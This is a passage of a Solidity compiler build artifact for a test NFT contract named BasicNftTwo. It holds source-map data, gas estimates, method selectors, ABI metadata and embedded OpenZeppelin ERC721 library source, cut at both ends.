572:232::-;22712:34;22708:1;22700:6;22696:14;22689:58;22781:15;22776:2;22768:6;22764:15;22757:40;22572:232;:::o;22810:237::-;22950:34;22946:1;22938:6;22934:14;22927:58;23019:20;23014:2;23006:6;23002:15;22995:45;22810:237;:::o;23053:224::-;23193:34;23189:1;23181:6;23177:14;23170:58;23262:7;23257:2;23249:6;23245:15;23238:32;23053:224;:::o;23283:178::-;23423:30;23419:1;23411:6;23407:14;23400:54;23283:178;:::o;23467:223::-;23607:34;23603:1;23595:6;23591:14;23584:58;23676:6;23671:2;23663:6;23659:15;23652:31;23467:223;:::o;23696:175::-;23836:27;23832:1;23824:6;23820:14;23813:51;23696:175;:::o;23877:228::-;24017:34;24013:1;24005:6;24001:14;23994:58;24086:11;24081:2;24073:6;24069:15;24062:36;23877:228;:::o;24111:182::-;24251:34;24247:1;24239:6;24235:14;24228:58;24111:182;:::o;24299:174::-;24439:26;24435:1;24427:6;24423:14;24416:50;24299:174;:::o;24479:235::-;24619:34;24615:1;24607:6;24603:14;24596:58;24688:18;24683:2;24675:6;24671:15;24664:43;24479:235;:::o;24720:220::-;24860:34;24856:1;24848:6;24844:14;24837:58;24929:3;24924:2;24916:6;24912:15;24905:28;24720:220;:::o;24946:248::-;25086:34;25082:1;25074:6;25070:14;25063:58;25155:31;25150:2;25142:6;25138:15;25131:56;24946:248;:::o;25200:122::-;25273:24;25291:5;25273:24;:::i;:::-;25266:5;25263:35;25253:63;;25312:1;25309;25302:12;25253:63;25200:122;:::o;25328:116::-;25398:21;25413:5;25398:21;:::i;:::-;25391:5;25388:32;25378:60;;25434:1;25431;25424:12;25378:60;25328:116;:::o;25450:120::-;25522:23;25539:5;25522:23;:::i;:::-;25515:5;25512:34;25502:62;;25560:1;25557;25550:12;25502:62;25450:120;:::o;25576:122::-;25649:24;25667:5;25649:24;:::i;:::-;25642:5;25639:35;25629:63;;25688:1;25685;25678:12;25629:63;25576:122;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"1913000","executionCost":"infinite","totalCost":"infinite"},"external":{"TOKEN_URI()":"infinite","approve(address,uint256)":"infinite","balanceOf(address)":"2902","getApproved(uint256)":"5300","getTokenCounter()":"2526","isApprovedForAll(address,address)":"infinite","mintNft()":"infinite","name()":"infinite","ownerOf(uint256)":"3069","safeTransferFrom(address,address,uint256)":"infinite","safeTransferFrom(address,address,uint256,bytes)":"infinite","setApprovalForAll(address,bool)":"infinite","supportsInterface(bytes4)":"797","symbol()":"infinite","tokenURI(uint256)":"infinite","transferFrom(address,address,uint256)":"infinite"}},"methodIdentifiers":{"TOKEN_URI()":"78ce9035","approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","getApproved(uint256)":"081812fc","getTokenCounter()":"6e02007d","isApprovedForAll(address,address)":"e985e9c5","mintNft()":"c2229fea","name()":"06fdde03","ownerOf(uint256)":"6352211e","safeTransferFrom(address,address,uint256)":"42842e0e","safeTransferFrom(address,address,uint256,bytes)":"b88d4fde","setApprovalForAll(address,bool)":"a22cb465","supportsInterface(bytes4)":"01ffc9a7","symbol()":"95d89b41","tokenURI(uint256)":"c87b56dd","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"DogMinted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TOKEN_URI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTokenCounter\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mintNft\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"approve(address,uint256)\":{\"details\":\"See {IERC721-approve}.\"},\"balanceOf(address)\":{\"details\":\"See {IERC721-balanceOf}.\"},\"getApproved(uint256)\":{\"details\":\"See {IERC721-getApproved}.\"},\"isApprovedForAll(address,address)\":{\"details\":\"See {IERC721-isApprovedForAll}.\"},\"name()\":{\"details\":\"See {IERC721Metadata-name}.\"},\"ownerOf(uint256)\":{\"details\":\"See {IERC721-ownerOf}.\"},\"safeTransferFrom(address,address,uint256)\":{\"details\":\"See {IERC721-safeTransferFrom}.\"},\"safeTransferFrom(address,address,uint256,bytes)\":{\"details\":\"See {IERC721-safeTransferFrom}.\"},\"setApprovalForAll(address,bool)\":{\"details\":\"See {IERC721-setApprovalForAll}.\"},\"supportsInterface(bytes4)\":{\"details\":\"See {IERC165-supportsInterface}.\"},\"symbol()\":{\"details\":\"See {IERC721Metadata-symbol}.\"},\"tokenURI(uint256)\":{\"details\":\"See {IERC721Metadata-tokenURI}.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC721-transferFrom}.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/test/BasicNftTwo.sol\":\"BasicNftTwo\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC721/ERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/ERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC721.sol\\\";\\nimport \\\"./IERC721Receiver.sol\\\";\\nimport \\\"./extensions/IERC721Metadata.sol\\\";\\nimport \\\"../../utils/Address.sol\\\";\\nimport \\\"../../utils/Context.sol\\\";\\nimport \\\"../../utils/Strings.sol\\\";\\nimport \\\"../../utils/introspection/ERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\\n * {ERC721Enumerable}.\\n */\\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\\n    using Address for address;\\n    using Strings for uint256;\\n\\n    // Token name\\n    string private _name;\\n\\n    // Token symbol\\n    string private _symbol;\\n\\n    // Mapping from token ID to owner address\\n    mapping(uint256 => address) private _owners;\\n\\n    // Mapping owner address to token count\\n    mapping(address => uint256) private _balances;\\n\\n    // Mapping from token ID to approved address\\n    mapping(uint256 => address) private _tokenApprovals;\\n\\n    // Mapping from owner to operator approvals\\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\\n\\n    /**\\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\\n        return\\n            interfaceId == type(IERC721).interfaceId ||\\n            interfaceId == type(IERC721Metadata).interfaceId ||\\n            super.supportsInterface(interfaceId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-balanceOf}.\\n     */\\n    function balanceOf(address owner) public view virtual override returns (uint256) {\\n        require(owner != address(0), \\\"ERC721: address zero is not a valid owner\\\");\\n        return _balances[owner];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-ownerOf}.\\n     */\\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) {\\n        address owner = _ownerOf(tokenId);\\n        require(owner != address(0), \\\"ERC721: invalid token ID\\\");\\n        return owner;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-name}.\\n     */\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-symbol}.\\n     */\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev See {IERC721Metadata-tokenURI}.\\n     */\\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\\n        _requireMinted(tokenId);\\n\\n        string memory baseURI = _baseURI();\\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \\\"\\\";\\n    }\\n\\n    /**\\n     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each\\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\\n     * by default, can be overridden in child contracts.\\n     */\\n    function _baseURI() internal view virtual returns (string memory) {\\n        return \\\"\\\";\\n    }\\n\\n    /**\\n     * @dev See {IERC721-approve}.\\n     */\\n    function approve(address to, uint256 tokenId) public virtual override {\\n        address owner = ERC721.ownerOf(tokenId);\\n        require(to != owner, \\\"ERC721: approval to current owner\\\");\\n\\n        require(\\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\\n            \\\"ERC721: approve caller is not token owner or approved for all\\\"\\n        );\\n\\n        _approve(to, tokenId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-getApproved}.\\n     */\\n    function getApproved(uint256 tokenId) public view virtual override returns (address) {\\n        _requireMinted(tokenId);\\n\\n        return _tokenApprovals[tokenId];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-setApprovalForAll}.\\n     */\\n    function setApprovalForAll(address operator, bool approved) public virtual override {\\n        _setApprovalForAll(_msgSender(), operator, approved);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-isApprovedForAll}.\\n     */\\n    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\\n        return _operatorApprovals[owner][operator];\\n    }\\n\\n    /**\\n     * @dev See {IERC721-transferFrom}.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) public virtual override {\\n        //solhint-disable-next-line max-line-length\\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \\\"ERC721: caller is not token owner or approved\\\");\\n\\n        _transfer(from, to, tokenId);\\n    }\\n\\n    /**\\n     * @dev See {IERC721-safeTransferFrom}.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) public virtual override {\\n        safeTransferFrom(from, to, tokenId, \\\"\\\");\\n    }\\n\\n    /**\\n     * @dev See {IERC721-safeTransferFrom}.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) public virtual override {\\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \\\"ERC721: caller is not token owner or approved\\\");\\n        _safeTransfer(from, to, tokenId, data);\\n    }\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\\n     *\\n     * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.\\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _safeTransfer(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) internal virtual {\\n        _transfer(from, to, tokenId);\\n        require(_checkOnERC721Received(from, to, tokenId, data), \\\"ERC721: transfer to non ERC721Receiver implementer\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\\n     */\\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\\n        return _owners[tokenId];\\n    }\\n\\n    /**\\n     * @dev Returns whether `tokenId` exists.\\n     *\\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\\n     *\\n     * Tokens start existing when they are minted (`_mint`),\\n     * and stop existing when they are burned (`_burn`).\\n     */\\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\\n        return _ownerOf(tokenId) != address(0);\\n    }\\n\\n    /**\\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\\n        address owner = ERC721.ownerOf(tokenId);\\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\\n    }\\n\\n    /**\\n     * @dev Safely mints `tokenId` and transfers it to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must not exist.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _safeMint(address to, uint256 tokenId) internal virtual {\\n        _safeMint(to, tokenId, \\\"\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\\n     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.\\n     */\\n    function _safeMint(\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) internal virtual {\\n        _mint(to, tokenId);\\n        require(\\n            _checkOnERC721Received(address(0), to, tokenId, data),\\n            \\\"ERC721: transfer to non ERC721Receiver implementer\\\"\\n        );\\n    }\\n\\n    /**\\n     * @dev Mints `tokenId` and transfers it to `to`.\\n     *\\n     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must not exist.\\n     * - `to` cannot be the zero address.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _mint(address to, uint256 tokenId) internal virtual {\\n        require(to != address(0), \\\"ERC721: mint to the zero address\\\");\\n        require(!_exists(tokenId), \\\"ERC721: token already minted\\\");\\n\\n        _beforeTokenTransfer(address(0), to, tokenId, 1);\\n\\n        // Check that tokenId was not minted by `_beforeTokenTransfer` hook\\n        require(!_exists(tokenId), \\\"ERC721: token already minted\\\");\\n\\n        unchecked {\\n            // Will not overflow unless all 2**256 token ids are minted to the same owner.\\n            // Given that tokens are minted one by one, it is impossible in practice that\\n            // this ever happens. Might change if we allow batch minting.\\n            // The ERC fails to describe this case.\\n            _balances[to] += 1;\\n        }\\n\\n        _owners[tokenId] = to;\\n\\n        emit Transfer(address(0), to, tokenId);\\n\\n        _afterTokenTransfer(address(0), to, tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Destroys `tokenId`.\\n     * The approval is cleared when the token is burned.\\n     * This is an internal function that does not check if the sender is authorized to operate on the token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _burn(uint256 tokenId) internal virtual {\\n        address owner = ERC721.ownerOf(tokenId);\\n\\n        _beforeTokenTransfer(owner, address(0), tokenId, 1);\\n\\n        // Update ownership in case tokenId was transferred by `_beforeTokenTransfer` hook\\n        owner = ERC721.ownerOf(tokenId);\\n\\n        // Clear approvals\\n        delete _tokenApprovals[tokenId];\\n\\n        unchecked {\\n            // Cannot overflow, as that would require more tokens to be burned/transferred\\n            // out than the owner initially received through minting and transferring in.\\n            _balances[owner] -= 1;\\n        }\\n        delete _owners[tokenId];\\n\\n        emit Transfer(owner, address(0), tokenId);\\n\\n        _afterTokenTransfer(owner, address(0), tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Transfers `tokenId` from `from` to `to`.\\n     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) internal virtual {\\n        require(ERC721.ownerOf(tokenId) == from, \\\"ERC721: transfer from incorrect owner\\\");\\n        require(to != address(0), \\\"ERC721: transfer to the zero address\\\");\\n\\n        _beforeTokenTransfer(from, to, tokenId, 1);\\n\\n        // Check that tokenId was not transferred by `_beforeTokenTransfer` hook\\n        require(ERC721.ownerOf(tokenId) == from, \\\"ERC721: transfer from incorrect owner\\\");\\n\\n        // Clear approvals from the previous owner\\n        delete _tokenApprovals[tokenId];\\n\\n        unchecked {\\n            // `_balances[from]` cannot overflow for the same reason as described in `_burn`:\\n            // `from`'s balance is the number of token held, which is at least one before the current\\n            // transfer.\\n            // `_balances[to]` could overflow in the conditions described in `_mint`. That would require\\n            // all 2**256 token ids to be minted, which in practice is impossible.\\n            _balances[from] -= 1;\\n            _balances[to] += 1;\\n        }\\n        _owners[tokenId] = to;\\n\\n        emit Transfer(from, to, tokenId);\\n\\n        _afterTokenTransfer(from, to, tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Approve `to` to operate on `tokenId`\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function _approve(address to, uint256 tokenId) internal virtual {\\n        _tokenApprovals[tokenId] = to;\\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\\n    }\\n\\n    /**\\n     * @dev Approve `operator` to operate on all of `owner` tokens\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function _setApprovalForAll(\\n        address owner,\\n        address operator,\\n        bool approved\\n    ) internal virtual {\\n        require(owner != operator, \\\"ERC721: approve to caller\\\");\\n        _operatorApprovals[owner][operator] = approved;\\n        emit ApprovalForAll(owner, operator, approved);\\n    }\\n\\n    /**\\n     * @dev Reverts if the `tokenId` has not been minted yet.\\n     */\\n    function _requireMinted(uint256 tokenId) internal view virtual {\\n        require(_exists(tokenId), \\\"ERC721: invalid token ID\\\");\\n    }\\n\\n    /**\\n     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\\n     * The call is not executed if the target address is not a contract.\\n     *\\n     * @param from address representing the previous owner of the given token ID\\n     * @param to target address that will receive the tokens\\n     * @param tokenId uint256 ID of the token to be transferred\\n     * @param data bytes optional data to send along with the call\\n     * @return bool whether the call correctly returned the expected magic value\\n     */\\n    function _checkOnERC721Received(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) private returns (bool) {\\n        if (to.isContract()) {\\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\\n                return retval == IERC721Receiver.onERC721Received.selector;\\n            } catch (bytes memory reason) {\\n                if (reason.length == 0) {\\n                    revert(\\\"ERC721: transfer to non ERC721Receiver implementer\\\");\\n                } else {\\n                    /// @solidity memory-safe-assembly\\n                    assembly {\\n                        revert(add(32, reason), mload(reason))\\n                    }\\n                }\\n            }\\n        } else {\\n            return true;\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called before any token transfer. This includes minting and burning. If {ERC721Consecutive} is\\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\\n     *\\n     * Calling conditions:\\n     *\\n     * - When `from` and `to` are both non-zero, ``from``'s tokens will be transferred to `to`.\\n     * - When `from` is zero, the tokens will be minted for `to`.\\n     * - When `to` is zero, ``from``'s tokens will be burned.\\n     * - `from` and `to` are never both zero.\\n     * - `batchSize` is non-zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256, /* firstTokenId */\\n        uint256 batchSize\\n    ) internal virtual {\\n        if (batchSize > 1) {\\n            if (from != address(0)) {\\n                _balances[from] -= batchSize;\\n            }\\n            if (to != address(0)) {\\n                _balances[to] += batchSize;\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called after any token transfer. This includes minting and burning. If {ERC721Consecutive} is\\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\\n     *\\n     * Calling conditions:\\n     *\\n     * - When `from` and `to` are both non-zero, ``from``'s tokens were transferred to `to`.\\n     * - When `from` is zero, the tokens were minted for `to`.\\n     * - When `to` is zero, ``from``'s tokens were burned.\\n     * - `from` and `to` are never both zero.\\n     * - `batchSize` is non-zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 firstTokenId,\\n        uint256 batchSize\\n    ) internal virtual {}\\n}\\n\",\"keccak256\":\"0xd89f3585b211fc9e3408384a4c4efdc3a93b2f877a3821046fa01c219d35be1b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../../utils/introspection/IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     